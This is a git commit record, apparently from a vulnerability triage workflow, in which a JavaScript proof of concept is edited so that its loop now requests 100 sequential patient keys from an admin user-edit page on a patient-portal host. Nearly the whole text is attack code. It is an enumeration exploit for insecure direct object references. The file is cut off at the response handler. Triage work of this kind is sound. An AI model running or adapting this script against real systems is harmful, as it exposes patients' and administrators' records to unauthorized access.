6d8e7bb53de0dddbd61ba7f197a373c564a6be11
LVtriage <luis@inspectiv.com>
2025-08-19 09:26:56 -0500

    Update 36838.js

--- 36838.js
+++ 36838.js
@@ -1,4 +1,4 @@
-for (let i = 199234; i <= 199237; i++) {
+for (let i = 199200; i <= 199299; i++) {
   fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
     .then(res => res.text())
     .then(res => {
